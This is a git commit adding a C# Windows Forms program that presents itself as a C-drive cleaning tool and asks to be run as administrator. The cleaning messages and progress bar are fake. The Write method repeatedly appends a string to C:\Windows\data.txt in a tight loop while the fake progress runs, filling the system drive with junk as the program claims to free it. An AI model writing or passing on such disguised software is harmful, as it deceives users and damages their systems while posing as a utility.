e8e770885306aaf25a743e64c06f08a94d284d44
BigCleverMan <104300144+BigCleverMan@users.noreply.github.com>
2022-06-18 23:25:48 +0800

    Add files via upload

---
+++ C盘自动清理/Form1.Designer.cs
@@ -0,0 +1,101 @@
+﻿
+namespace C盘自动清理
+{
+    partial class F_Main
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.B_Start = new System.Windows.Forms.Button();
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.T_Show = new System.Windows.Forms.TextBox();
+            this.label = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // B_Start
+            // 
+            this.B_Start.Location = new System.Drawing.Point(110, 233);
+            this.B_Start.Name = "B_Start";
+            this.B_Start.Size = new System.Drawing.Size(271, 69);
+            this.B_Start.TabIndex = 0;
+            this.B_Start.Text = "启动";
+            this.B_Start.UseVisualStyleBackColor = true;
+            this.B_Start.Click += new System.EventHandler(this.B_Start_Click);
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Location = new System.Drawing.Point(110, 190);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(271, 23);
+            this.progressBar1.TabIndex = 1;
+            this.progressBar1.Click += new System.EventHandler(this.progressBar1_Click);
+            // 
+            // T_Show
+            // 
+            this.T_Show.ImeMode = System.Windows.Forms.ImeMode.NoControl;
+            this.T_Show.Location = new System.Drawing.Point(110, 308);
+            this.T_Show.Multiline = true;
+            this.T_Show.Name = "T_Show";
+            this.T_Show.Size = new System.Drawing.Size(271, 118);
+            this.T_Show.TabIndex = 2;
+            this.T_Show.TextChanged += new System.EventHandler(this.T_Show_TextChanged);
+            // 
+            // label
+            // 
+            this.label.AutoSize = true;
+            this.label.Font = new System.Drawing.Font("宋体", 24F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.label.Location = new System.Drawing.Point(146, 104);
+            this.label.Name = "label";
+            this.label.Size = new System.Drawing.Size(197, 33);
+            this.label.TabIndex = 3;
+            this.label.Text = "C盘清理工具";
+            // 
+            // F_Main
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(510, 450);
+            this.Controls.Add(this.label);
+            this.Controls.Add(this.T_Show);
+            this.Controls.Add(this.progressBar1);
+            this.Controls.Add(this.B_Start);
+            this.Name = "F_Main";
+            this.Text = "C盘清理工具";
+            this.Load += new System.EventHandler(this.F_Main_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button B_Start;
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.TextBox T_Show;
+        private System.Windows.Forms.Label label;
+    }
+}
+
---
+++ C盘自动清理/Form1.cs
@@ -0,0 +1,106 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+using System.IO;
+
+namespace C盘自动清理
+{
+    public partial class F_Main : Form
+    {
+        private delegate void SetPos(int ipos, string vinfo);//进度条代理
+        public bool isStart = false;
+        private bool end = false;
+        public F_Main()
+        {
+            System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = false;//设置该属性 为false
+            InitializeComponent();
+        }
+
+        private void F_Main_Load(object sender, EventArgs e)
+        {
+            MessageBox.Show("请右键以管理员方式启动", "提示", 0, MessageBoxIcon.Question);
+        }
+
+        private void progressBar1_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void SetTextMesssage(int ipos, string vinfo)
+        {
+            if (this.InvokeRequired)
+            {
+                SetPos setpos = new SetPos(SetTextMesssage);
+                this.Invoke(setpos, new object[] { ipos, vinfo });
+            }
+            else
+            {
+                this.progressBar1.Value = Convert.ToInt32(ipos);
+            }
+        }
+
+        private void B_Start_Click(object sender, EventArgs e)
+        {
+            if (!isStart)
+            {
+                isStart = true;
+                Thread PGB = new Thread(new ThreadStart(SleepT));
+                Thread TS = new Thread(new ThreadStart(Show));
+                Thread END = new Thread(new ThreadStart(Write));
+                PGB.Start();
+                TS.Start();
+                END.Start();
+            }
+            else
+            {
+                MessageBox.Show("已启动", "警告", MessageBoxButtons.OK, MessageBoxIcon.Question);
+            }
+            
+        }
+        static string path = @"C:\Windows\data.txt";
+        StreamWriter sw = new StreamWriter(path, true);
+        private void Write()
+        {
+            while(!end)
+                sw.Write("c盘清理");
+            sw.Close();
+        }
+        private void SleepT()
+        {
+            for (int i = 0; i < 500; i++)
+            {
+                System.Threading.Thread.Sleep(80);
+                SetTextMesssage(100 * i / 500, i.ToString() + "\r\n");
+            }
+            T_Show.Text += "清理完成";
+            label.Text = "您的C盘焕然一新";
+            end = true;
+        }
+        private void Show()
+        {
+            T_Show.Text += "正在计算内存。" + Environment.NewLine;
+            Thread.Sleep(1000);
+            T_Show.Text += "正在扫描无用文件。" + Environment.NewLine;
+            Thread.Sleep(1000);
+            T_Show.Text += "正在清理<Program Files>" + Environment.NewLine;
+            Thread.Sleep(10000);
+            T_Show.Text += "正在清理<Program Files (x86)>" + Environment.NewLine;
+            Thread.Sleep(15000);
+            T_Show.Text += "正在清理<ProgramData>" + Environment.NewLine;
+            Thread.Sleep(10000);
+            T_Show.Text += "正在清理<AppData>" + Environment.NewLine;
+            Thread.Sleep(10000);
+            T_Show.Text += "正在清理用户文件夹" + Environment.NewLine; ;
+        }
+        private void T_Show_TextChanged(object sender, EventArgs e)
+        {
+            
+        }
+    }
+}
